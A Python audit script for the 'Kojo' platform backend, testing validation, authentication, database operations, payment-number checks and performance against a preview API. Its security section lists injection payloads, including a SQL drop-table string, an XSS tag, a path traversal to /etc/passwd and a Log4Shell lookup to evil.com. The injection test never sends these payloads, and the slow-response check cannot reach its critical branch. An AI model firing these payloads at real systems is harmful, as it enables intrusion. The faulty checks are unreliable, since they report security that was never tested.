#!/usr/bin/env python3
"""
AUDIT COMPLET DU BACKEND KOJO - DÉTECTION ET RÉSOLUTION DE TOUTES LES ERREURS
Comprehensive Backend Audit for Kojo Platform

This script performs an exhaustive audit of the backend system to identify:
1. Code errors (syntax/logic)
2. Pydantic model validation issues
3. API endpoint error handling problems
4. Security vulnerabilities
5. Database operation issues
6. Business service problems
7. Performance issues
8. Logging and monitoring problems
"""

import requests
import sys
import json
import io
import jwt
import time
import threading
import concurrent.futures
from datetime import datetime, timedelta
import base64
import os

class ComprehensiveBackendAuditor:
    def __init__(self, base_url="https://geoloc-boost.preview.emergentagent.com/api"):
        self.base_url = base_url
        self.client_token = None
        self.worker_token = None
        self.owner_token = None
        self.client_user = None
        self.worker_user = None
        self.owner_user = None
        self.test_job_id = None
        self.tests_run = 0
        self.tests_passed = 0
        self.critical_errors = []
        self.warnings = []
        self.performance_issues = []
        self.security_issues = []
        
    def log_critical_error(self, category, description, details=None):
        """Log a critical error that needs immediate attention"""
        error = {
            "category": category,
            "description": description,
            "details": details,
            "timestamp": datetime.now().isoformat()
        }
        self.critical_errors.append(error)
        print(f"🚨 CRITICAL ERROR [{category}]: {description}")
        if details:
            print(f"   Details: {details}")
    
    def log_warning(self, category, description, details=None):
        """Log a warning that should be addressed"""
        warning = {
            "category": category,
            "description": description,
            "details": details,
            "timestamp": datetime.now().isoformat()
        }
        self.warnings.append(warning)
        print(f"⚠️  WARNING [{category}]: {description}")
        if details:
            print(f"   Details: {details}")
    
    def log_performance_issue(self, endpoint, response_time, details=None):
        """Log performance issues"""
        issue = {
            "endpoint": endpoint,
            "response_time": response_time,
            "details": details,
            "timestamp": datetime.now().isoformat()
        }
        self.performance_issues.append(issue)
        if response_time > 5.0:
            print(f"🐌 PERFORMANCE ISSUE: {endpoint} took {response_time:.2f}s")
    
    def log_security_issue(self, category, description, severity="HIGH"):
        """Log security issues"""
        issue = {
            "category": category,
            "description": description,
            "severity": severity,
            "timestamp": datetime.now().isoformat()
        }
        self.security_issues.append(issue)
        print(f"🔒 SECURITY ISSUE [{severity}]: {description}")

    def run_test_with_timing(self, name, method, endpoint, expected_status, data=None, token=None, timeout=30):
        """Run a test with performance timing and comprehensive error analysis"""
        url = f"{self.base_url}/{endpoint}"
        headers = {'Content-Type': 'application/json'}
        if token:
            headers['Authorization'] = f'Bearer {token}'

        self.tests_run += 1
        print(f"\n🔍 Testing {name}...")
        print(f"   URL: {url}")
        
        start_time = time.time()
        
        try:
            if method == 'GET':
                response = requests.get(url, headers=headers, timeout=timeout)
            elif method == 'POST':
                response = requests.post(url, json=data, headers=headers, timeout=timeout)
            elif method == 'PUT':
                response = requests.put(url, json=data, headers=headers, timeout=timeout)
            elif method == 'DELETE':
                response = requests.delete(url, headers=headers, timeout=timeout)
            
            response_time = time.time() - start_time
            self.log_performance_issue(endpoint, response_time)
            
            success = response.status_code == expected_status
            if success:
                self.tests_passed += 1
                print(f"✅ Passed - Status: {response.status_code} ({response_time:.2f}s)")
                try:
                    response_data = response.json()
                    if isinstance(response_data, dict) and len(str(response_data)) < 500:
                        print(f"   Response: {response_data}")
                    return True, response_data
                except:
                    return True, {}
            else:
                print(f"❌ Failed - Expected {expected_status}, got {response.status_code} ({response_time:.2f}s)")
                try:
                    error_data = response.json()
                    print(f"   Error: {error_data}")
                    
                    # Analyze error for critical issues
                    if response.status_code == 500:
                        self.log_critical_error("SERVER_ERROR", f"Internal server error on {endpoint}", error_data)
                    elif response.status_code == 502:
                        self.log_critical_error("BAD_GATEWAY", f"Bad gateway error on {endpoint}", error_data)
                    elif response.status_code == 503:
                        self.log_critical_error("SERVICE_UNAVAILABLE", f"Service unavailable on {endpoint}", error_data)
                    
                    return False, error_data
                except:
                    error_text = response.text
                    print(f"   Error: {error_text}")
                    
                    # Check for HTML error pages (indicates server misconfiguration)
                    if "<html>" in error_text.lower() or "<!doctype" in error_text.lower():
                        self.log_critical_error("HTML_ERROR_RESPONSE", f"Received HTML instead of JSON on {endpoint}", error_text[:200])
                    
                    return False, {"error": error_text}

        except requests.exceptions.Timeout:
            response_time = time.time() - start_time
            self.log_critical_error("TIMEOUT", f"Request timeout on {endpoint} after {timeout}s", f"Response time: {response_time:.2f}s")
            print(f"❌ Failed - Timeout after {timeout}s")
            return False, {}
        except requests.exceptions.ConnectionError as e:
            self.log_critical_error("CONNECTION_ERROR", f"Connection error on {endpoint}", str(e))
            print(f"❌ Failed - Connection Error: {str(e)}")
            return False, {}
        except Exception as e:
            self.log_critical_error("UNEXPECTED_ERROR", f"Unexpected error on {endpoint}", str(e))
            print(f"❌ Failed - Error: {str(e)}")
            return False, {}

    def audit_1_code_errors_and_syntax(self):
        """AUDIT 1: Vérifier les erreurs de code, syntaxe et logique"""
        print("\n" + "="*80)
        print("AUDIT 1: ERREURS DE CODE, SYNTAXE ET LOGIQUE")
        print("="*80)
        
        # Test basic endpoints to check for syntax errors
        self.run_test_with_timing("Health Check - Basic Syntax", "GET", "health", 200)
        self.run_test_with_timing("Root Endpoint - Basic Syntax", "GET", "", 200)
        self.run_test_with_timing("Stats Endpoint - Basic Syntax", "GET", "stats", 200)
        
        # Test endpoints that might have logic errors
        self.run_test_with_timing("Jobs Endpoint Without Auth", "GET", "jobs", 403)
        self.run_test_with_timing("Profile Endpoint Without Auth", "GET", "users/profile", 403)
        
        # Test malformed requests to check error handling
        print("\n🔍 Testing Malformed Requests...")
        
        # Test with invalid JSON
        try:
            url = f"{self.base_url}/auth/register"
            headers = {'Content-Type': 'application/json'}
            response = requests.post(url, data="invalid json", headers=headers, timeout=10)
            
            if response.status_code == 422:
                print("✅ Invalid JSON properly handled with 422")
                self.tests_passed += 1
            else:
                self.log_critical_error("JSON_PARSING", f"Invalid JSON not properly handled, got {response.status_code}", response.text[:200])
            self.tests_run += 1
        except Exception as e:
            self.log_critical_error("JSON_PARSING_EXCEPTION", "Exception when sending invalid JSON", str(e))
            self.tests_run += 1

    def audit_2_pydantic_model_validation(self):
        """AUDIT 2: Validation des modèles Pydantic"""
        print("\n" + "="*80)
        print("AUDIT 2: VALIDATION DES MODÈLES PYDANTIC")
        print("="*80)
        
        # Test user registration with various invalid data
        invalid_user_tests = [
            {
                "name": "Empty first_name",
                "data": {
                    "email": "test@test.com",
                    "password": "TestPass123!",
                    "first_name": "",
                    "last_name": "Test",
                    "phone": "+221701234567",
                    "user_type": "client",
                    "country": "senegal",
                    "preferred_language": "fr"
                },
                "expected": 422
            },
            {
                "name": "First name too short",
                "data": {
                    "email": "test@test.com",
                    "password": "TestPass123!",
                    "first_name": "a",
                    "last_name": "Test",
                    "phone": "+221701234567",
                    "user_type": "client",
                    "country": "senegal",
                    "preferred_language": "fr"
                },
                "expected": 422
            },
            {
                "name": "Invalid email format",
                "data": {
                    "email": "invalid-email",
                    "password": "TestPass123!",
                    "first_name": "Test",
                    "last_name": "User",
                    "phone": "+221701234567",
                    "user_type": "client",
                    "country": "senegal",
                    "preferred_language": "fr"
                },
                "expected": 422
            },
            {
                "name": "Invalid phone format",
                "data": {
                    "email": "test@test.com",
                    "password": "TestPass123!",
                    "first_name": "Test",
                    "last_name": "User",
                    "phone": "invalid-phone",
                    "user_type": "client",
                    "country": "senegal",
                    "preferred_language": "fr"
                },
                "expected": 422
            },
            {
                "name": "Invalid user_type",
                "data": {
                    "email": "test@test.com",
                    "password": "TestPass123!",
                    "first_name": "Test",
                    "last_name": "User",
                    "phone": "+221701234567",
                    "user_type": "invalid_type",
                    "country": "senegal",
                    "preferred_language": "fr"
                },
                "expected": 422
            },
            {
                "name": "Invalid country",
                "data": {
                    "email": "test@test.com",
                    "password": "TestPass123!",
                    "first_name": "Test",
                    "last_name": "User",
                    "phone": "+221701234567",
                    "user_type": "client",
                    "country": "invalid_country",
                    "preferred_language": "fr"
                },
                "expected": 422
            },
            {
                "name": "Missing required field",
                "data": {
                    "email": "test@test.com",
                    "password": "TestPass123!",
                    "first_name": "Test",
                    # Missing last_name
                    "phone": "+221701234567",
                    "user_type": "client",
                    "country": "senegal",
                    "preferred_language": "fr"
                },
                "expected": 422
            }
        ]
        
        for test in invalid_user_tests:
            success, response = self.run_test_with_timing(
                f"Pydantic Validation - {test['name']}",
                "POST",
                "auth/register",
                test["expected"],
                data=test["data"]
            )
            
            if not success and test["expected"] == 422:
                # Check if error message is in French and informative
                if isinstance(response, dict) and "detail" in response:
                    detail = response["detail"]
                    if isinstance(detail, str) and any(french_word in detail.lower() for french_word in ["doit", "requis", "invalide", "caractères"]):
                        print(f"   ✅ French error message: {detail}")
                    else:
                        self.log_warning("VALIDATION_MESSAGE", f"Error message not in French or not informative: {detail}")
                else:
                    self.log_warning("VALIDATION_RESPONSE", f"Validation error response format unexpected: {response}")

    def audit_3_api_endpoint_error_handling(self):
        """AUDIT 3: Gestion d'erreur complète sur tous endpoints"""
        print("\n" + "="*80)
        print("AUDIT 3: GESTION D'ERREUR COMPLÈTE SUR TOUS ENDPOINTS")
        print("="*80)
        
        # Test various error scenarios
        error_scenarios = [
            {
                "name": "Non-existent endpoint",
                "method": "GET",
                "endpoint": "non-existent-endpoint",
                "expected": 404
            },
            {
                "name": "Invalid HTTP method",
                "method": "PATCH",
                "endpoint": "health",
                "expected": 405
            },
            {
                "name": "Missing Content-Type header",
                "method": "POST",
                "endpoint": "auth/register",
                "expected": [400, 422],
                "custom_test": True
            }
        ]
        
        for scenario in error_scenarios:
            if scenario.get("custom_test"):
                # Custom test for missing Content-Type
                try:
                    url = f"{self.base_url}/{scenario['endpoint']}"
                    response = requests.post(url, data='{"test": "data"}', timeout=10)
                    
                    if response.status_code in scenario["expected"]:
                        print(f"✅ {scenario['name']} - Status: {response.status_code}")
                        self.tests_passed += 1
                    else:
                        print(f"❌ {scenario['name']} - Expected {scenario['expected']}, got {response.status_code}")
                        self.log_warning("ERROR_HANDLING", f"Unexpected status code for {scenario['name']}")
                    self.tests_run += 1
                except Exception as e:
                    self.log_critical_error("ERROR_HANDLING_EXCEPTION", f"Exception in {scenario['name']}", str(e))
                    self.tests_run += 1
            else:
                self.run_test_with_timing(
                    f"Error Handling - {scenario['name']}",
                    scenario["method"],
                    scenario["endpoint"],
                    scenario["expected"]
                )

    def audit_4_security_vulnerabilities(self):
        """AUDIT 4: Audit de la sécurité"""
        print("\n" + "="*80)
        print("AUDIT 4: AUDIT DE LA SÉCURITÉ")
        print("="*80)
        
        # Test JWT security
        print("\n🔍 Testing JWT Security...")
        
        # Test with invalid JWT token
        invalid_tokens = [
            "invalid.jwt.token",
            "Bearer invalid",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature",
            "",
            "null"
        ]
        
        for token in invalid_tokens:
            try:
                url = f"{self.base_url}/users/profile"
                headers = {'Authorization': f'Bearer {token}'}
                response = requests.get(url, headers=headers, timeout=10)
                
                if response.status_code in [401, 403]:
                    print(f"✅ Invalid token properly rejected: {token[:20]}...")
                    self.tests_passed += 1
                else:
                    self.log_security_issue("JWT_VALIDATION", f"Invalid token not properly rejected: {token[:20]}..., got {response.status_code}")
                self.tests_run += 1
            except Exception as e:
                self.log_critical_error("JWT_SECURITY_EXCEPTION", f"Exception testing invalid token", str(e))
                self.tests_run += 1
        
        # Test SQL injection attempts (even though using MongoDB)
        print("\n🔍 Testing Injection Attacks...")
        
        injection_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}"
        ]
        
        for payload in injection_payloads:
            test_data = {
                "email": f"{payload}@test.com",
                "password": "TestPass123!",
                "first_name": payload,
                "last_name": "Test",
                "phone": "+221701234567",
                "user_type": "client",
                "country": "senegal",
                "preferred_language": "fr"
            }
            
            success, response = self.run_test_with_timing(
                f"Injection Test - {payload[:20]}...",
                "POST",
                "auth/register",
                422  # Should be rejected by validation
            )
            
            if not success:
                print(f"   ✅ Injection payload properly rejected")
            else:
                self.log_security_issue("INJECTION_VULNERABILITY", f"Injection payload not properly rejected: {payload}")

    def audit_5_database_operations(self):
        """AUDIT 5: Audit de la base de données"""
        print("\n" + "="*80)
        print("AUDIT 5: AUDIT DE LA BASE DE DONNÉES")
        print("="*80)
        
        # Test database connectivity through health endpoint
        success, response = self.run_test_with_timing("Database Connectivity", "GET", "health", 200)
        
        if success and isinstance(response, dict):
            if response.get("database") == "connected":
                print("✅ Database connection confirmed")
            else:
                self.log_critical_error("DATABASE_CONNECTION", "Database not properly connected", response)
        
        # Test database operations through user registration
        timestamp = datetime.now().strftime('%H%M%S%f')
        test_user_data = {
            "email": f"db_test_{timestamp}@test.com",
            "password": "TestPass123!",
            "first_name": "Database",
            "last_name": "Test",
            "phone": f"+22170{timestamp[-7:]}",
            "user_type": "client",
            "country": "senegal",
            "preferred_language": "fr"
        }
        
        success, response = self.run_test_with_timing(
            "Database Write Operation",
            "POST",
            "auth/register",
            200,
            data=test_user_data
        )
        
        if success and 'access_token' in response:
            token = response['access_token']
            user_id = response['user']['id']
            
            # Test database read operation
            success, profile_response = self.run_test_with_timing(
                "Database Read Operation",
                "GET",
                "users/profile",
                200,
                token=token
            )
            
            if success:
                if profile_response.get('id') == user_id:
                    print("✅ Database read/write consistency verified")
                else:
                    self.log_critical_error("DATABASE_CONSISTENCY", "Database read/write inconsistency detected")
            
            # Test database update operation
            update_data = {"first_name": "Updated"}
            success, update_response = self.run_test_with_timing(
                "Database Update Operation",
                "PUT",
                "users/profile",
                200,
                data=update_data,
                token=token
            )
            
            if success:
                # Verify update
                success, verify_response = self.run_test_with_timing(
                    "Database Update Verification",
                    "GET",
                    "users/profile",
                    200,
                    token=token
                )
                
                if success and verify_response.get('first_name') == 'Updated':
                    print("✅ Database update operation verified")
                else:
                    self.log_critical_error("DATABASE_UPDATE", "Database update operation failed")

    def audit_6_business_services(self):
        """AUDIT 6: Audit des services métier"""
        print("\n" + "="*80)
        print("AUDIT 6: AUDIT DES SERVICES MÉTIER")
        print("="*80)
        
        # Test payment validation services
        print("\n🔍 Testing Payment Validation Services...")
        
        # Test Orange Money validation
        orange_money_tests = [
            {
                "number": "+221701234567",
                "country": "senegal",
                "should_pass": True
            },
            {
                "number": "+223701234567", 
                "country": "mali",
                "should_pass": True
            },
            {
                "number": "+1234567890",
                "country": "senegal",
                "should_pass": False
            }
        ]
        
        for i, test in enumerate(orange_money_tests):
            timestamp = datetime.now().strftime('%H%M%S%f')
            test_data = {
                "email": f"orange_test_{i}_{timestamp}@test.com",
                "password": "TestPass123!",
                "first_name": "Orange",
                "last_name": "Test",
                "phone": test["number"],
                "user_type": "client",
                "country": test["country"],
                "preferred_language": "fr",
                "payment_accounts": {
                    "orange_money": test["number"]
                }
            }
            
            expected_status = 200 if test["should_pass"] else 400
            success, response = self.run_test_with_timing(
                f"Orange Money Validation - {test['number']}",
                "POST",
                "auth/register-verified",
                expected_status,
                data=test_data
            )
            
            if test["should_pass"] and not success:
                self.log_critical_error("ORANGE_MONEY_VALIDATION", f"Valid Orange Money number rejected: {test['number']}")
            elif not test["should_pass"] and success:
                self.log_critical_error("ORANGE_MONEY_VALIDATION", f"Invalid Orange Money number accepted: {test['number']}")
        
        # Test Wave validation
        wave_tests = [
            {
                "number": "+221701234567",
                "country": "senegal", 
                "should_pass": True
            },
            {
                "number": "+225701234567",
                "country": "ivory_coast",
                "should_pass": True
            }
        ]
        
        for i, test in enumerate(wave_tests):
            timestamp = datetime.now().strftime('%H%M%S%f')
            test_data = {
                "email": f"wave_test_{i}_{timestamp}@test.com",
                "password": "TestPass123!",
                "first_name": "Wave",
                "last_name": "Test",
                "phone": test["number"],
                "user_type": "client",
                "country": test["country"],
                "preferred_language": "fr",
                "payment_accounts": {
                    "wave": test["number"]
                }
            }
            
            expected_status = 200 if test["should_pass"] else 400
            success, response = self.run_test_with_timing(
                f"Wave Validation - {test['number']}",
                "POST",
                "auth/register-verified",
                expected_status,
                data=test_data
            )

    def audit_7_performance_issues(self):
        """AUDIT 7: Audit de performance"""
        print("\n" + "="*80)
        print("AUDIT 7: AUDIT DE PERFORMANCE")
        print("="*80)
        
        # Test endpoint response times
        performance_endpoints = [
            ("health", "GET", None),
            ("stats", "GET", None),
            ("", "GET", None)
        ]
        
        for endpoint, method, token in performance_endpoints:
            start_time = time.time()
            success, response = self.run_test_with_timing(
                f"Performance Test - {endpoint or 'root'}",
                method,
                endpoint,
                200,
                token=token
            )
            response_time = time.time() - start_time
            
            if response_time > 2.0:
                self.log_warning("PERFORMANCE", f"Slow response time for {endpoint}: {response_time:.2f}s")
            elif response_time > 5.0:
                self.log_critical_error("PERFORMANCE", f"Very slow response time for {endpoint}: {response_time:.2f}s")
        
        # Test concurrent requests
        print("\n🔍 Testing Concurrent Request Handling...")
        
        def make_health_request():
            try:
                response = requests.get(f"{self.base_url}/health", timeout=10)
                return response.status_code == 200
            except:
                return False
        
        # Test with 10 concurrent requests
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(make_health_request) for _ in range(10)]
            results = [future.result() for future in concurrent.futures.as_completed(futures)]
        
        success_rate = sum(results) / len(results)
        if success_rate < 0.9:
            self.log_critical_error("CONCURRENCY", f"Poor concurrent request handling: {success_rate*100:.1f}% success rate")
        else:
            print(f"✅ Concurrent request handling: {success_rate*100:.1f}% success rate")

    def audit_8_logging_and_monitoring(self):
        """AUDIT 8: Audit des logs et monitoring"""
        print("\n" + "="*80)
        print("AUDIT 8: AUDIT DES LOGS ET MONITORING")
        print("="*80)
        
        # Test if endpoints return appropriate status codes for monitoring
        monitoring_tests = [
            {
                "name": "Health endpoint returns structured data",
                "endpoint": "health",
                "method": "GET",
                "expected": 200,
                "check_structure": True
            },
            {
                "name": "Stats endpoint returns monitoring data",
                "endpoint": "stats", 
                "method": "GET",
                "expected": 200,
                "check_structure": True
            }
        ]
        
        for test in monitoring_tests:
            success, response = self.run_test_with_timing(
                test["name"],
                test["method"],
                test["endpoint"],
                test["expected"]
            )
            
            if success and test.get("check_structure"):
                if isinstance(response, dict):
                    if test["endpoint"] == "health":
                        required_fields = ["status", "timestamp", "database"]
                        missing_fields = [field for field in required_fields if field not in response]
                        if missing_fields:
                            self.log_warning("MONITORING_STRUCTURE", f"Health endpoint missing fields: {missing_fields}")
                        else:
                            print("✅ Health endpoint has proper structure")
                    
                    elif test["endpoint"] == "stats":
                        required_fields = ["total_users", "total_jobs", "timestamp"]
                        missing_fields = [field for field in required_fields if field not in response]
                        if missing_fields:
                            self.log_warning("MONITORING_STRUCTURE", f"Stats endpoint missing fields: {missing_fields}")
                        else:
                            print("✅ Stats endpoint has proper structure")
                else:
                    self.log_warning("MONITORING_RESPONSE", f"{test['endpoint']} endpoint doesn't return structured data")

    def audit_9_edge_cases_and_boundary_conditions(self):
        """AUDIT 9: Test des cas limites et conditions aux limites"""
        print("\n" + "="*80)
        print("AUDIT 9: CAS LIMITES ET CONDITIONS AUX LIMITES")
        print("="*80)
        
        # Test very long inputs
        long_string = "a" * 1000
        very_long_string = "a" * 10000
        
        edge_case_tests = [
            {
                "name": "Very long first name",
                "data": {
                    "email": "test@test.com",
                    "password": "TestPass123!",
                    "first_name": long_string,
                    "last_name": "Test",
                    "phone": "+221701234567",
                    "user_type": "client",
                    "country": "senegal",
                    "preferred_language": "fr"
                },
                "expected": 422
            },
            {
                "name": "Extremely long email",
                "data": {
                    "email": f"{very_long_string}@test.com",
                    "password": "TestPass123!",
                    "first_name": "Test",
                    "last_name": "User",
                    "phone": "+221701234567",
                    "user_type": "client",
                    "country": "senegal",
                    "preferred_language": "fr"
                },
                "expected": 422
            },
            {
                "name": "Unicode characters in name",
                "data": {
                    "email": "unicode@test.com",
                    "password": "TestPass123!",
                    "first_name": "Tëst",
                    "last_name": "Üsér",
                    "phone": "+221701234567",
                    "user_type": "client",
                    "country": "senegal",
                    "preferred_language": "fr"
                },
                "expected": 200
            }
        ]
        
        for test in edge_case_tests:
            self.run_test_with_timing(
                f"Edge Case - {test['name']}",
                "POST",
                "auth/register",
                test["expected"],
                data=test["data"]
            )

    def audit_10_comprehensive_endpoint_coverage(self):
        """AUDIT 10: Couverture complète de tous les endpoints"""
        print("\n" + "="*80)
        print("AUDIT 10: COUVERTURE COMPLÈTE DE TOUS LES ENDPOINTS")
        print("="*80)
        
        # Create test users for comprehensive testing
        timestamp = datetime.now().strftime('%H%M%S%f')
        
        # Create client
        client_data = {
            "email": f"audit_client_{timestamp}@test.com",
            "password": "TestPass123!",
            "first_name": "Audit",
            "last_name": "Client",
            "phone": f"+22170{timestamp[-7:]}",
            "user_type": "client",
            "country": "senegal",
            "preferred_language": "fr"
        }
        
        success, response = self.run_test_with_timing(
            "Create Audit Client",
            "POST",
            "auth/register",
            200,
            data=client_data
        )
        
        if success and 'access_token' in response:
            self.client_token = response['access_token']
            self.client_user = response['user']
        
        # Create worker
        worker_data = {
            "email": f"audit_worker_{timestamp}@test.com",
            "password": "TestPass123!",
            "first_name": "Audit",
            "last_name": "Worker",
            "phone": f"+22370{timestamp[-7:]}",
            "user_type": "worker",
            "country": "mali",
            "preferred_language": "fr"
        }
        
        success, response = self.run_test_with_timing(
            "Create Audit Worker",
            "POST",
            "auth/register",
            200,
            data=worker_data
        )
        
        if success and 'access_token' in response:
            self.worker_token = response['access_token']
            self.worker_user = response['user']
        
        # Test all major endpoints
        if self.client_token:
            # Profile endpoints
            self.run_test_with_timing("Get Client Profile", "GET", "users/profile", 200, token=self.client_token)
            
            # Job endpoints
            job_data = {
                "title": "Audit Test Job",
                "description": "This is a test job for the audit process",
                "category": "testing",
                "budget_min": 10000.0,
                "budget_max": 20000.0,
                "location": {"address": "Dakar, Senegal"},
                "required_skills": ["testing"]
            }
            
            success, job_response = self.run_test_with_timing(
                "Create Job",
                "POST",
                "jobs",
                200,
                data=job_data,
                token=self.client_token
            )
            
            if success and 'id' in job_response:
                self.test_job_id = job_response['id']
                
                # Test job retrieval
                self.run_test_with_timing("Get Jobs", "GET", "jobs", 200, token=self.client_token)
                self.run_test_with_timing("Get Specific Job", "GET", f"jobs/{self.test_job_id}", 200, token=self.client_token)
        
        if self.worker_token and self.test_job_id:
            # Worker profile endpoints
            worker_profile_data = {
                "user_id": self.worker_user['id'],
                "specialties": ["testing", "auditing"],
                "experience_years": 5,
                "availability": True
            }
            
            self.run_test_with_timing(
                "Create Worker Profile",
                "POST",
                "workers/profile",
                200,
                data=worker_profile_data,
                token=self.worker_token
            )
            
            # Job proposal endpoints
            proposal_data = {
                "proposed_amount": 15000.0,
                "estimated_completion_time": "1 day",
                "message": "I can complete this audit job efficiently"
            }
            
            self.run_test_with_timing(
                "Create Job Proposal",
                "POST",
                f"jobs/{self.test_job_id}/proposals",
                200,
                data=proposal_data,
                token=self.worker_token
            )
        
        # Test messaging if both users exist
        if self.client_token and self.worker_token and self.worker_user:
            message_data = {
                "receiver_id": self.worker_user['id'],
                "content": "Hello, this is an audit test message"
            }
            
            self.run_test_with_timing(
                "Send Message",
                "POST",
                "messages",
                200,
                data=message_data,
                token=self.client_token
            )
            
            self.run_test_with_timing(
                "Get Conversations",
                "GET",
                "messages/conversations",
                200,
                token=self.client_token
            )

    def generate_audit_report(self):
        """Generate comprehensive audit report"""
        print("\n" + "="*80)
        print("RAPPORT D'AUDIT COMPLET DU BACKEND KOJO")
        print("="*80)
        
        print(f"\n📊 STATISTIQUES GÉNÉRALES:")
        print(f"   Tests exécutés: {self.tests_run}")
        print(f"   Tests réussis: {self.tests_passed}")
        print(f"   Taux de réussite: {(self.tests_passed/self.tests_run*100):.1f}%" if self.tests_run > 0 else "   Taux de réussite: 0%")
        
        print(f"\n🚨 ERREURS CRITIQUES ({len(self.critical_errors)}):")
        if self.critical_errors:
            for error in self.critical_errors:
                print(f"   [{error['category']}] {error['description']}")
                if error['details']:
                    print(f"      Détails: {error['details']}")
        else:
            print("   ✅ Aucune erreur critique détectée")
        
        print(f"\n⚠️  AVERTISSEMENTS ({len(self.warnings)}):")
        if self.warnings:
            for warning in self.warnings:
                print(f"   [{warning['category']}] {warning['description']}")
        else:
            print("   ✅ Aucun avertissement")
        
        print(f"\n🐌 PROBLÈMES DE PERFORMANCE ({len([p for p in self.performance_issues if p['response_time'] > 2.0])}):")
        slow_endpoints = [p for p in self.performance_issues if p['response_time'] > 2.0]
        if slow_endpoints:
            for issue in slow_endpoints:
                print(f"   {issue['endpoint']}: {issue['response_time']:.2f}s")
        else:
            print("   ✅ Aucun problème de performance majeur")
        
        print(f"\n🔒 PROBLÈMES DE SÉCURITÉ ({len(self.security_issues)}):")
        if self.security_issues:
            for issue in self.security_issues:
                print(f"   [{issue['severity']}] {issue['description']}")
        else:
            print("   ✅ Aucun problème de sécurité détecté")
        
        # Overall assessment
        critical_count = len(self.critical_errors)
        warning_count = len(self.warnings)
        security_count = len(self.security_issues)
        
        print(f"\n🎯 ÉVALUATION GLOBALE:")
        if critical_count == 0 and security_count == 0:
            if warning_count <= 2:
                print("   ✅ EXCELLENT - Backend prêt pour la production")
            else:
                print("   ✅ TRÈS BON - Quelques améliorations mineures recommandées")
        elif critical_count <= 2 and security_count == 0:
            print("   ⚠️  BON - Corrections mineures nécessaires")
        elif critical_count <= 5 or security_count <= 2:
            print("   ❌ MOYEN - Corrections importantes nécessaires")
        else:
            print("   🚨 CRITIQUE - Corrections urgentes requises avant production")
        
        return {
            "tests_run": self.tests_run,
            "tests_passed": self.tests_passed,
            "success_rate": (self.tests_passed/self.tests_run*100) if self.tests_run > 0 else 0,
            "critical_errors": len(self.critical_errors),
            "warnings": len(self.warnings),
            "security_issues": len(self.security_issues),
            "performance_issues": len([p for p in self.performance_issues if p['response_time'] > 2.0])
        }

    def run_comprehensive_audit(self):
        """Run the complete comprehensive audit"""
        print("🚀 DÉMARRAGE DE L'AUDIT COMPLET DU BACKEND KOJO")
        print("=" * 80)
        
        start_time = time.time()
        
        try:
            # Run all audit phases
            self.audit_1_code_errors_and_syntax()
            self.audit_2_pydantic_model_validation()
            self.audit_3_api_endpoint_error_handling()
            self.audit_4_security_vulnerabilities()
            self.audit_5_database_operations()
            self.audit_6_business_services()
            self.audit_7_performance_issues()
            self.audit_8_logging_and_monitoring()
            self.audit_9_edge_cases_and_boundary_conditions()
            self.audit_10_comprehensive_endpoint_coverage()
            
        except Exception as e:
            self.log_critical_error("AUDIT_EXCEPTION", "Exception during audit execution", str(e))
        
        total_time = time.time() - start_time
        print(f"\n⏱️  Audit terminé en {total_time:.2f} secondes")
        
        # Generate final report
        return self.generate_audit_report()

if __name__ == "__main__":
    auditor = ComprehensiveBackendAuditor()
    report = auditor.run_comprehensive_audit()
    
    # Exit with appropriate code
    if report["critical_errors"] > 0 or report["security_issues"] > 0:
        sys.exit(1)
    else:
        sys.exit(0)